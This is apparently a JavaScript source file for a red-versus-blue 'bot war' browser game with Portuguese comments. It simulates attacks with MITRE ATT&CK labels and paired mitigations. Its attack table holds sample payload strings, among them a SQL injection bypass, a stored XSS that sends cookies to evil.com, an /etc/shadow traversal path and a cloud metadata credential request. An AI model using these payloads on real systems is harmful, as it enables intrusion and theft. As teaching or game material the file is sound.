/**
 * BotWarEngine v2.0 - Red vs Blue AI Duel
 * Ataques com referências MITRE ATT&CK + condição de vitória Blue Team.
 */
class BotWarEngine {
    constructor() {
        this.systemIntegrity = 100;
        this.exploitProgress = 0;
        this.isActive = false;
        this.interval = null;
        this.history = [];
        this.blueWinTicks = 0;
        this.blueWinThreshold = 20;
        this.difficulty = 'logica'; // Default
    }

    startDuel(diff = 'logica') {
        this.difficulty = diff;
        this.isActive = true;
        this.systemIntegrity = 100;
        this.exploitProgress = 0;
        this.history = [];
        this.blueWinTicks = 0;
        this.log(`ARENA: Protocolo iniciado em nível ${this.difficulty.toUpperCase()}.`, 'info');
        this.log('INTEL: MITRE ATT&CK framework carregado. Modo realístico ativado.', 'info');
        this.interval = setInterval(() => this.tick(), 2000);
    }

    stopDuel() {
        this.isActive = false;
        clearInterval(this.interval);
    }

    tick() {
        if (!this.isActive) return;

        const attack = this.generateAttack();
        this.log(`[RED | ${attack.mitre}] ${attack.type}: ${attack.payload}`, 'danger');

        setTimeout(() => {
            let defenseChance = 0.65; // 'logica'
            let damageMult = 1.0;

            if (this.difficulty === 'iniciante') {
                defenseChance = 0.8;
                damageMult = 0.7;
            } else if (this.difficulty === 'massiva') {
                defenseChance = 0.45;
                damageMult = 1.4;
            }

            const success = Math.random() < defenseChance;
            if (success) {
                this.log(`[BLUE] Gemma detectou ${attack.type}. Aplicando ${attack.mitigation}...`, 'info');
                this.log(`[BLUE] Bloqueio efetuado. Integridade preservada.`, 'success');
                this.exploitProgress = Math.max(0, this.exploitProgress - 5);
                this.blueWinTicks++;
            } else {
                const actualDamage = Math.floor(attack.damage * damageMult);
                this.log(`[RED] ${attack.type} penetrou as defesas! Dano: -${actualDamage}%`, 'warning');
                this.systemIntegrity = Math.max(0, this.systemIntegrity - actualDamage);
                this.exploitProgress = Math.min(100, this.exploitProgress + 10);
                this.blueWinTicks = 0;
            }

            this.updateUI();

            if (this.systemIntegrity <= 0) {
                this.log('!!! SISTEMA TOTALMENTE COMPROMETIDO - VITÓRIA RED BOT !!!', 'danger');
                this.stopDuel();
                window.dispatchEvent(new CustomEvent('bot_war_over', { detail: { result: 'red_win' } }));
            } else if (this.exploitProgress >= 100) {
                this.log('!!! EXPLOIT COMPLETO - ACESSO ROOT CONCEDIDO - VITÓRIA RED BOT !!!', 'danger');
                this.stopDuel();
                window.dispatchEvent(new CustomEvent('bot_war_over', { detail: { result: 'red_win' } }));
            } else if (this.blueWinTicks >= this.blueWinThreshold && this.systemIntegrity > 60) {
                this.log(`🏆 BLUE BOT VENCEU! ${this.blueWinTicks} ataques neutralizados. Sistema íntegro em ${this.systemIntegrity}%.`, 'success');
                this.stopDuel();
                window.dispatchEvent(new CustomEvent('bot_war_over', { detail: { result: 'blue_win' } }));
            }
        }, 1000);
    }

    generateAttack() {
        const attacks = [
            { type: 'SQL Injection',         payload: "' OR 1=1-- (Auth Bypass)",                    mitigation: 'WAF Rule #42 + Prepared Statements', damage: 15, mitre: 'T1190' },
            { type: 'Buffer Overflow',        payload: "A".repeat(256) + "\\xef\\xbe\\xad\\xde",      mitigation: 'ASLR/DEP/Stack Canaries',             damage: 25, mitre: 'T1203' },
            { type: 'XSS Stored',             payload: "<script>fetch('//evil.com?c='+document.cookie)</script>", mitigation: 'CSP + Output Encoding',  damage: 10, mitre: 'T1059.007' },
            { type: 'Directory Traversal',    payload: "../../../../etc/shadow",                      mitigation: 'Chroot + Path Validation',            damage: 20, mitre: 'T1083' },
            { type: 'RCE Deserialization',    payload: "O:4:\"User\":1:{s:8:\"isAdmin\";b:1;}",       mitigation: 'Input Validation + RASP',             damage: 30, mitre: 'T1059' },
            { type: 'Ransomware Deploy',      payload: "CryptoLocker v3 spreading via SMB share",    mitigation: 'EDR + Immutable Backups',             damage: 40, mitre: 'T1486' },
            { type: 'Pass-the-Hash',          payload: "NTLM Hash: aad3b435b51404eeaad3b435b51404ee", mitigation: 'Zero Trust + Kerberos',             damage: 25, mitre: 'T1550.002' },
            { type: 'Phishing Email',         payload: "Urgent: VPN credentials at c0rp.com/login", mitigation: 'Email Filter + MFA + DMARC',          damage: 15, mitre: 'T1566.001' },
            { type: 'Supply Chain Attack',    payload: "Malicious pkg: event-stream@3.3.7",          mitigation: 'SCA + Dependency Pinning',            damage: 35, mitre: 'T1195.002' },
            { type: 'Zero-Day Exploit',       payload: "CVE-2025-53770: SharePoint unauthenticated RCE", mitigation: 'Virtual Patch + SIEM Alert',     damage: 45, mitre: 'T1203' },
            { type: 'SSRF Cloud Metadata',    payload: "GET http://169.254.169.254/iam/credentials", mitigation: 'IMDSv2 + WAF SSRF Rules',            damage: 20, mitre: 'T1552.005' },
            { type: 'Credential Stuffing',    payload: "1000 req/min from 45 different IPs (botnet)", mitigation: 'Rate Limiting + CAPTCHA + MFA',    damage: 20, mitre: 'T1110.004' }
        ];
        return attacks[Math.floor(Math.random() * attacks.length)];
    }

    log(msg, type = 'default') {
        const entry = { msg, type, time: new Date().toLocaleTimeString() };
        this.history.unshift(entry);
        if (this.history.length > 30) this.history.pop();
        window.dispatchEvent(new CustomEvent('bot_war_log', { detail: entry }));
    }

    manualAttack(type) {
        if (!this.isActive) return;
        const attack = this.getAttackByType(type);
        this.log(`[USER-RED | ${attack.mitre}] ${attack.type} MANUAL lançado!`, 'danger');
        this.systemIntegrity = Math.max(0, this.systemIntegrity - attack.damage);
        this.exploitProgress = Math.min(100, this.exploitProgress + 10);
        this.blueWinTicks = 0;
        this.updateUI();
        if (window.os) os.showNotification(`Ataque ${attack.type} enviado!`, 'danger');
        if (this.systemIntegrity <= 0) {
            this.log('!!! SISTEMA COMPROMETIDO POR ATAQUE MANUAL !!!', 'danger');
            this.stopDuel();
            window.dispatchEvent(new CustomEvent('bot_war_over', { detail: { result: 'red_win' } }));
        }
    }

    manualDefend(type) {
        if (!this.isActive) return;
        const labels = { WAF: 'WAF/CSP rules', IPS: 'IPS block', PATCH: 'Virtual Patch', EDR: 'EDR containment', ZT: 'Zero Trust' };
        this.log(`[USER-BLUE] ${labels[type] || type} aplicado manualmente!`, 'success');
        this.systemIntegrity = Math.min(100, this.systemIntegrity + 10);
        this.exploitProgress = Math.max(0, this.exploitProgress - 15);
        this.blueWinTicks++;
        this.updateUI();
        if (window.os) os.showNotification(`Defesa ${type} aplicada!`, 'success');
    }

    getAttackByType(type) {
        const attacks = {
            sqli:       { type: 'SQL Injection',     damage: 15, mitre: 'T1190' },
            bof:        { type: 'Buffer Overflow',    damage: 25, mitre: 'T1203' },
            xss:        { type: 'XSS',               damage: 10, mitre: 'T1059.007' },
            ransomware: { type: 'Ransomware',         damage: 40, mitre: 'T1486' },
            phishing:   { type: 'Phishing',          damage: 15, mitre: 'T1566.001' },
            zeroday:    { type: 'Zero-Day',           damage: 45, mitre: 'T1203' }
        };
        return attacks[type] || attacks['sqli'];
    }

    updateUI() {
        window.dispatchEvent(new CustomEvent('bot_war_update', {
            detail: { integrity: this.systemIntegrity, progress: this.exploitProgress, blueTicks: this.blueWinTicks }
        }));
    }
}

window.botWar = new BotWarEngine();
